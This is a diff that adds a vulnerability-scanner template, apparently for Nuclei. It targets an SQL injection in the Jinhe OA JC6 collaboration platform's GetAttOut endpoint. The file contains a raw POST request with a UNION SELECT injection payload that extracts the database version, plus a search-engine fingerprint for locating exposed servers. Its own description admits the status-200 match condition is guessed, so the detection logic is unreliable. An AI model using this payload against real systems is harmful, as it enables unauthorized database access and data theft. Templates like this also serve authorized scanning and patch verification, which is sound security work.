@@ -1,0 +1,42 @@
+id: poc-5dd916934779926210ae
+info:
+  name: 金和OAJC6GetAttOut存在sql注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/5dd916934779926210ae086b8f94c2f2
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 5dd916934779926210ae086b8f94c2f2
+    fofa: + hunter`web.body="JC6金和协同管理平台"`
+http:
+- raw:
+  - 'POST /jc6/JHSoft.WCF/TEST/GetAttOut HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
+
+    Accept: */*
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate, br
+
+    Connection: close
+
+    Cookie: JSESSIONID=7D7F9059114C952E2EE944538F3209E8; JSESSIONID=570EB1805FAA212E05C191C594180568
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 52
+
+
+    1'' union select null,null,@@version,null,null,null--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
